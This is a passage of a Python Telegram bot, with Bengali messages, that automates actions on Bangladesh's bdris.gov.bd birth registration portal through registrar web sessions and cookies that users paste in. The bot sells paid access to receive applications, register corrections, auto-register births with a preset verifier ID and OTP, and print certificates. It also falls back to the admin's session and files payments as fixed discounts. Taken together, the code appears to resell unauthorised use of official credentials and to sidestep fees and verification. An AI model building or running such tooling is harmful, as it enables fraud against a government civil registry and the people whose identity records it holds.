                    'chalanDistrict': '', 'chalanBankBranch': '', 
                    'paymentType': 'PAYMENT_BY_DISCOUNT', 'discountGiven': 'true',
                    'discountAmount': '50', 'discountSharokNo': str(curr_sharok), 
                    'discountSharokDate': datetime.now().strftime("%d/%m/%Y"), '_csrf': active_csrf
                }
                
                extra_headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
                res = call_api(uid, "https://bdris.gov.bd/api/payment/receive", method="POST", data=data, extra_headers=extra_headers)
                
                if res and res.status_code == 200:
                    save_session_to_db(uid, fresh_sess)
                    safe_send(cid, f"✅ পেমেন্ট সফল! {cost}৳ কাটা হয়েছে।" if cost > 0 else "✅ পেমেন্ট সফল!")
                else:
                    if cost > 0: update_balance(uid, cost)
                    safe_send(cid, "❌ পেমেন্ট ব্যর্থ! রিফান্ড করা হয়েছে।")
            except Exception as e:
                logging.error(f"Payment Error: {e}")
                if cost > 0: update_balance(uid, cost)
                safe_send(cid, "❌ পেমেন্টে সমস্যা। রিফান্ড করা হয়েছে।")
            finally:
                with download_lock: active_downloads.discard(task_id)
                
        Thread(target=process_payment, daemon=True).start()

    elif action == "recv":
        bot.answer_callback_query(call.id, "⏳ রিসিভ প্রসেস হচ্ছে...")
        def process_recv():
            try:
                fresh_sess = get_session(uid)
                _, active_csrf = get_active_session(fresh_sess)
                res = call_api(uid, "https://bdris.gov.bd/api/application/receive", method="POST", data={'data': enc_id, '_csrf': active_csrf})
                if res and res.status_code == 200: safe_send(cid, "✅ রিসিভ সফল!")
                else: safe_send(cid, "❌ রিসিভ ব্যর্থ!")
            except Exception as e:
                logging.error(f"Receive Error: {e}")
                safe_send(cid, "❌ রিসিভ এরর।")
        Thread(target=process_recv, daemon=True).start()

    elif action == "coreg" and mode == "CHAIRMAN":
        bot.answer_callback_query(call.id, "⏳ কারেকশন রেজিস্টার হচ্ছে...")
        def process_coreg():
            try:
                fresh_sess = get_session(uid)
                ch_sess, _ = get_active_session(fresh_sess)
                _, active_csrf = get_active_session(fresh_sess)
                
                headers = {
                    'User-Agent': fresh_sess.get("ua", "Mozilla/5.0"),
                    'Referer': 'https://bdris.gov.bd/admin/',
                    'Origin': 'https://bdris.gov.bd',
                    'client': 'bris',
                    'x-csrf-token': active_csrf,
                    'x-requested-with': 'XMLHttpRequest',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                }
                
                payload = {"data": enc_id}
                res = ch_sess.post("https://bdris.gov.bd/api/br/correction/application/correct", headers=headers, data=payload, timeout=HTTP_TIMEOUT)
                
                if res and res.status_code == 200: safe_send(cid, "✅ কারেকশন (Correction) সফলভাবে রেজিস্টার হয়েছে!")
                else: safe_send(cid, f"❌ কারেকশন ব্যর্থ। সার্ভার রেসপন্স: {res.status_code if res else 'None'}")
            except Exception as e:
                logging.error(f"Correction Reg Error: {e}")
                safe_send(cid, "❌ কারেকশন রেজিস্ট্রেশনে এরর।")
        Thread(target=process_coreg, daemon=True).start()

    elif action == "reg" and mode == "CHAIRMAN":
        bot.answer_callback_query(call.id, "⏳ চেক করা হচ্ছে...")
        
        user_record = access_collection.find_one({"chat_id": uid}) or {}
        v_ubrn = user_record.get("verifier_ubrn")
        v_name = user_record.get("verifier_name")
        
        if v_ubrn and v_name:
            def execute_auto_reg():
                try:
                    fresh_sess = get_session(uid)
                    ch_sess, _ = get_active_session(fresh_sess)
                    _, active_csrf = get_active_session(fresh_sess)
                    with session_lock: otp_val = fresh_sess.get("ch_otp", "")

                    today = datetime.now().strftime("%d/%m/%Y")
                    formatted_name = f"  {v_name} "
                    
                    payload_data = {
                        "birthPlaceAndDobVerifierName": formatted_name,
                        "birthPlaceAndDobVerifierBrn": v_ubrn,
                        "birthPlaceAndDobVerificationDate": today,
                        "permAddrVerifierName": formatted_name,
                        "permAddrVerifierBrn": v_ubrn,
                        "permAddrVerificationDate": today,
                        "otp": otp_val,
                        "data": enc_id
                    }
                    
                    headers = {
                        'User-Agent': fresh_sess.get("ua", "Mozilla/5.0"), 
                        'Referer': 'https://bdris.gov.bd/admin/',
                        'Origin': 'https://bdris.gov.bd',
                        'client': 'bris', 
                        'x-csrf-token': active_csrf, 
                        'x-requested-with': 'XMLHttpRequest',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                    }
                    
                    res_reg = ch_sess.post("https://bdris.gov.bd/api/br/application/register", headers=headers, data=payload_data, timeout=HTTP_TIMEOUT)
                    
                    if res_reg and res_reg.status_code == 200:
                        safe_send(cid, f"✅ *{v_name}* এর মাধ্যমে নতুন জন্ম নিবন্ধন অটোমেটিকভাবে রেজিস্টার হয়েছে!", parse_mode="Markdown")
                    else:
                        safe_send(cid, f"❌ অটো-রেজিস্ট্রেশন ব্যর্থ! সার্ভার রেসপন্স: {res_reg.status_code if res_reg else 'None'}")
                except Exception as e:
                    logging.error(f"Auto Reg Flow Error: {e}")
                    safe_send(cid, "❌ রেজিস্ট্রেশনে এরর হয়েছে।")
                    
            Thread(target=execute_auto_reg, daemon=True).start()
        else:
            msg = safe_send(cid, "👤 আপনার কোনো ডিফল্ট ভেরিফায়ার সেট করা নেই।\nঅনুগ্রহ করে যাচাইকারীর (Verifier) ১৭ ডিজিট UBRN দিন:")
            bot.register_next_step_handler_by_chat_id(cid, lambda m: process_reg_verifier_step(m, uid, enc_id, save_default=True))

    elif action == "print":
        perms = get_user_permissions(uid)
        if perms.get("print") or uid == ADMIN_ID:
            cost = get_service_cost(uid, "pdf")
            task_id = f"print_{uid}_{enc_id}"
            
            with download_lock:
                if task_id in active_downloads: 
                    return bot.answer_callback_query(call.id, "⚠️ প্রসেসিং-এ আছে...", show_alert=True)
                active_downloads.add(task_id)
                
            if cost > 0:
                if not deduct_balance(uid, cost):
                    with download_lock: active_downloads.discard(task_id)
                    return bot.answer_callback_query(call.id, f"❌ ব্যালেন্স নেই ({cost}৳)", show_alert=True)
                
            bot.answer_callback_query(call.id, "⏳ ডাউনলোড শুরু হচ্ছে...")
            
            with session_lock:
                working_uid = uid if u_sess.get("is_alive", False) else ADMIN_ID
            
            def print_pdf_thread():
                try: 
                    download_server_pdf(cid, working_uid, enc_id, f"Cert_{sid}")
                    safe_send(cid, f"✅ ডাউনলোড সফল! ব্যালেন্স: {get_balance(uid)}৳" if cost > 0 else "✅ ডাউনলোড সফল!")
                except Exception as e:
                    logging.error(f"PDF Print Error: {e}")
                    if cost > 0: update_balance(uid, cost)
                    safe_send(cid, "❌ এরর বা সার্ভার ডাউন। রিফান্ড করা হয়েছে।")
                finally:
                    with download_lock: active_downloads.discard(task_id)
                    
            Thread(target=print_pdf_thread, daemon=True).start()
        else: 
            bot.answer_callback_query(call.id, "🚫 অনুমতি নেই!", show_alert=True)
    else: 
        bot.answer_callback_query(call.id)

# ==========================================
# ১২. মেইন রাউটার
# ==========================================
@bot.message_handler(func=lambda m: True)
def router(m):
    cid, uid, t = m.chat.id, m.from_user.id, m.text or ""
    if not t: return safe_send(cid, "⚠️ শুধুমাত্র টেক্সট মেসেজ সাপোর্টেড।")
    if is_rate_limited(uid): return
    if not check_user_access(uid, m.from_user.first_name): return safe_send(cid, "🚫 অ্যাক্সেস নেই।")
        
    u_sess = get_session(uid)
    perms = get_user_permissions(uid)

    with session_lock:
        is_alive = u_sess.get("is_alive", False)

    if uid == ADMIN_ID:
        if t == "/payment_on":
            settings_collection.update_one({"_id": "config"}, {"$set": {"payment_active": True}})
            return safe_send(cid, "✅ পেমেন্ট চালু।", reply_markup=generate_main_menu(cid, uid))
        elif t == "/payment_off":
            settings_collection.update_one({"_id": "config"}, {"$set": {"payment_active": False}})
            return safe_send(cid, "❌ পেমেন্ট বন্ধ।", reply_markup=generate_main_menu(cid, uid))
        elif t == "🔑 Admin Login":
            safe_send(cid, "🔑 এডমিন সেশন দিন:")
            bot.register_next_step_handler_by_chat_id(cid, admin_login_logic)
            return
        elif t == "🧹 Clear Cookies":
            clear_user_session(uid)
            return safe_send(cid, "🧹 আপনার সেশন এবং কুকি সফলভাবে মুছে ফেলা হয়েছে।", reply_markup=generate_main_menu(cid, uid))
        elif t == "🛠️ Check Cookies":
            with session_lock:
                sec_c = u_sess['req_session'].cookies.get_dict()
                ch_c = u_sess['ch_session'].cookies.get_dict()
                otp_v = u_sess.get('ch_otp')
            return safe_send(cid, f"SEC: `{sec_c}`\nCH: `{ch_c}`\nOTP: `{otp_v}`", parse_mode="Markdown")
        elif t == "👥 Manage Users":
            try: users = list(access_collection.find({}, {"chat_id": 1, "name": 1, "status": 1, "balance": 1}))
            except: return safe_send(cid, "❌ DB এরর।")
            if not users: return safe_send(cid, "📭 কোনো ইউজার নেই।")
            markup = telebot.types.InlineKeyboardMarkup()
            for u in users:
                markup.row(telebot.types.InlineKeyboardButton(f"{'✅' if u.get('status')=='allowed' else '🚫'} {u.get('name','')} | {u.get('balance',0)}৳", callback_data=f"admuser:{u.get('chat_id')}"))
            return safe_send(cid, "👥 ইউজার প্যানেল:", reply_markup=markup)

    if t.startswith("/start") or "Back to Menu" in t:
        bot.clear_step_handler_by_chat_id(cid)
        return safe_send(cid, "🚀 BDRIS Master Bot Active!", reply_markup=generate_main_menu(cid, uid))

    elif "Dashboard" in t:
        if is_alive:
            navigate_to(uid, "https://bdris.gov.bd/admin/")
            safe_send(cid, "🏠 ড্যাশবোর্ড রিফ্রেশ হয়েছে।", reply_markup=generate_main_menu(cid, uid))
        else: safe_send(cid, "⚠️ আগে লগইন করুন।", reply_markup=generate_main_menu(cid, uid))
        return

    elif t == "💰 My Profile & Recharge":
        if not is_payment_active(): return safe_send(cid, "ℹ️ সার্ভিস ফ্রি।")
        safe_name = sanitize_name(m.from_user.first_name)
        msg = f"👤 Profile: {safe_name}\n🆔 ID: `{uid}`\n\n💰 Balance: {get_balance(uid)}৳"
        markup = telebot.types.InlineKeyboardMarkup().add(telebot.types.InlineKeyboardButton("➕ Add Balance", callback_data="reqrecharge"))
        return safe_send(cid, msg, reply_markup=markup, parse_mode="Markdown")

    elif t == "🔑 User Login":
        safe_send(cid, "✅ নিবন্ধকের সেশন দিন:")
        bot.register_next_step_handler_by_chat_id(cid, role_step_1)
        return

    elif t == "🖨️ Server PDF Print" and not is_alive and (perms.get("server_pdf") or uid == ADMIN_ID):
        safe_send(cid, "🖨️ ১৭ ডিজিট UBRN দিন:")
        bot.register_next_step_handler_by_chat_id(cid, download_server_by_ubrn)
        return

    elif is_alive:
        if t == "👤 নিবন্ধক সেকশন":
            with session_lock: u_sess["mode"] = "CHAIRMAN"
            save_session_to_db(uid, u_sess)
            safe_send(cid, "✅ নিবন্ধক সেকশন চালু।", reply_markup=generate_main_menu(cid, uid))
        elif t == "🧑‍💼 অথোরাইজড ইউজার":
            with session_lock: u_sess["mode"] = "SECRETARY"
            save_session_to_db(uid, u_sess)
            safe_send(cid, "✅ অথোরাইজড ইউজার সেকশন চালু।", reply_markup=generate_main_menu(cid, uid))
        elif t == "📋 Applications" and (perms.get("apps") or uid == ADMIN_ID): handle_category_init(m, 'apps')
        elif t == "📝 Correction" and (perms.get("corr") or uid == ADMIN_ID): handle_category_init(m, 'corr')
        elif t == "🔄 Reprint" and (perms.get("repr") or uid == ADMIN_ID): handle_category_init(m, 'repr')
        elif t == "🌐 Search By Name" and (perms.get("search") or uid == ADMIN_ID):
            safe_send(cid, "🔍 নাম দিন (বাংলায়):")
            bot.register_next_step_handler_by_chat_id(cid, process_search_by_name)
        elif t == "🔢 Search By UBRN" and (perms.get("search") or uid == ADMIN_ID):
            safe_send(cid, "🔢 UBRN দিন (১৭ ডিজিট):")
            bot.register_next_step_handler_by_chat_id(cid, process_search_by_ubrn)
        elif t == "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ" and (perms.get("ubrn_update") or uid == ADMIN_ID):
            start_ubrn_flow(m)
        elif t == "🖨️ Server PDF Print" and (perms.get("server_pdf") or uid == ADMIN_ID):
            safe_send(cid, "🖨️ ১৭ ডিজিট UBRN দিন:")
            bot.register_next_step_handler_by_chat_id(cid, download_server_by_ubrn)
        elif t == "📌 Set Default Verifier":
            safe_send(cid, "📌 আপনার ডিফল্ট ভেরিফায়ারের ১৭ ডিজিট UBRN দিন:")
            bot.register_next_step_handler_by_chat_id(cid, process_set_default_verifier)
        else: safe_send(cid, "⚠️ অজানা কমান্ড।", reply_markup=generate_main_menu(cid, uid))
        return

    safe_send(cid, "⚠️ আগে লগইন করুন।", reply_markup=generate_main_menu(cid, uid))

# ==========================================
# ১৩. Flask ও Main
# ==========================================
def run_flask():
    app = Flask(__name__)
    @app.route('/')
    def home(): return "✅ BDRIS Bot is Live and Running smoothly with Independent Workers!"
    
    try:
        port = int(os.environ.get("PORT", 10000) or 10000)
        app.run(host='0.0.0.0', port=port, use_reloader=False, threaded=True)
    except Exception as e:
        logging.error(f"Flask Error: {e}")

if __name__ == "__main__":
    logging.info("🚀 BDRIS Bot Starting...")
    
    try:
        bot.remove_webhook()
        time.sleep(1)
    except: pass

    # 📌 নতুন Independent Worker সিস্টেম চালু করা হয়েছে, পুরনো ലুপ বাদ।
    Thread(target=run_flask, daemon=True).start()
    
    logging.info("✅ Polling Started...")
    while True:
        try: 
            bot.infinity_polling(timeout=20, long_polling_timeout=20)
        except Exception as e: 
            logging.error(f"❌ Crash: {e}")
            time.sleep(3)
